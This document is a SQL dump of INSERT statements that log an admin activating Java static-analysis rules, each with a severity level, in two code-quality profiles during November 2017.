INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1710, '2017-11-20 11:00:23.935', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhT_bbGRdfPp-q4R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1711, '2017-11-20 11:00:23.979', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhUrbbGRdfPp-q4S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1712, '2017-11-20 11:00:24.038', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhVmbbGRdfPp-q4T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1713, '2017-11-20 11:00:24.113', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhWxbbGRdfPp-q4U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1714, '2017-11-20 11:00:24.167', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhXnbbGRdfPp-q4V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1715, '2017-11-20 11:00:24.191', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhX_bbGRdfPp-q4W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1716, '2017-11-20 11:00:24.23', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhYmbbGRdfPp-q4X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1717, '2017-11-20 11:00:24.255', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhY_bbGRdfPp-q4Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1718, '2017-11-20 11:00:24.322', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhaCbbGRdfPp-q4Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1719, '2017-11-20 11:00:24.35', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhaebbGRdfPp-q4a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1720, '2017-11-20 11:00:24.385', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhbBbbGRdfPp-q4b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1721, '2017-11-20 11:00:24.418', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhbibbGRdfPp-q4c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1722, '2017-11-20 11:00:24.461', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhcMbbGRdfPp-q4d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1723, '2017-11-20 11:00:24.506', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhc6bbGRdfPp-q4e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1724, '2017-11-20 11:00:24.543', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhdfbbGRdfPp-q4f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1725, '2017-11-20 11:00:24.571', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhd7bbGRdfPp-q4g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1726, '2017-11-20 11:00:24.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhepbbGRdfPp-q4h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1727, '2017-11-20 11:00:24.663', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhfXbbGRdfPp-q4i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1728, '2017-11-20 11:00:24.708', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhgDbbGRdfPp-q4j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1729, '2017-11-20 11:00:24.752', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhgwbbGRdfPp-q4k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1730, '2017-11-20 11:00:24.788', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhhUbbGRdfPp-q4l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1731, '2017-11-20 11:00:24.823', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhh3bbGRdfPp-q4m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1732, '2017-11-20 11:00:24.859', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhibbbGRdfPp-q4n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1733, '2017-11-20 11:00:24.894', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhi-bbGRdfPp-q4o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1734, '2017-11-20 11:00:24.951', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhj3bbGRdfPp-q4p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1735, '2017-11-20 11:00:25.009', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhkxbbGRdfPp-q4q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1736, '2017-11-20 11:00:25.104', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhmQbbGRdfPp-q4r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1737, '2017-11-20 11:00:25.194', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhnqbbGRdfPp-q4s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1738, '2017-11-20 11:00:25.232', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhoQbbGRdfPp-q4t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1739, '2017-11-20 11:00:25.268', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFho0bbGRdfPp-q4u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1740, '2017-11-20 11:00:25.3', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhpUbbGRdfPp-q4v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1741, '2017-11-20 11:00:25.33', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhpybbGRdfPp-q4w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1742, '2017-11-20 11:00:25.366', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhqWbbGRdfPp-q4x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1743, '2017-11-20 11:00:25.413', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhrFbbGRdfPp-q4y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1744, '2017-11-20 11:00:25.455', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhrvbbGRdfPp-q4z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1745, '2017-11-20 11:00:25.484', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhsMbbGRdfPp-q40');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1746, '2017-11-20 11:00:25.505', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhshbbGRdfPp-q41');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1747, '2017-11-20 11:00:25.541', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhtFbbGRdfPp-q42');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1748, '2017-11-20 11:00:25.588', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFht0bbGRdfPp-q43');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1749, '2017-11-20 11:00:25.631', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhufbbGRdfPp-q44');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1750, '2017-11-20 11:00:25.679', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhvPbbGRdfPp-q45');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1751, '2017-11-20 11:00:25.727', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhv_bbGRdfPp-q46');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1752, '2017-11-20 11:00:25.782', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhw2bbGRdfPp-q47');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1753, '2017-11-20 11:00:25.813', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhxVbbGRdfPp-q48');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1754, '2017-11-20 11:00:25.854', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhx-bbGRdfPp-q49');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1755, '2017-11-20 11:00:25.901', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhytbbGRdfPp-q4-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1756, '2017-11-20 11:00:25.96', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhzobbGRdfPp-q4_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1757, '2017-11-20 11:00:26.08', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFh1gbbGRdfPp-q5A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1758, '2017-11-20 11:00:26.123', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFh2LbbGRdfPp-q5B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1759, '2017-11-20 11:00:26.232', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFh34bbGRdfPp-q5C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1760, '2017-11-20 11:00:26.304', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFh4_bbGRdfPp-q5D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1761, '2017-11-20 11:00:26.347', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFh5rbbGRdfPp-q5E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1762, '2017-11-20 11:09:20.698', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkW6bbGRdfPp-q5F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1763, '2017-11-20 11:09:20.748', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkXsbbGRdfPp-q5G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1764, '2017-11-20 11:09:20.796', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkYcbbGRdfPp-q5H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1765, '2017-11-20 11:09:20.836', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkZEbbGRdfPp-q5I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1766, '2017-11-20 11:09:20.885', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkZ1bbGRdfPp-q5J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1767, '2017-11-20 11:09:20.929', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkahbbGRdfPp-q5K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1768, '2017-11-20 11:09:20.976', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkbPbbGRdfPp-q5L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1769, '2017-11-20 11:09:21.017', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkb5bbGRdfPp-q5M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1770, '2017-11-20 11:09:21.052', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkcbbbGRdfPp-q5N');
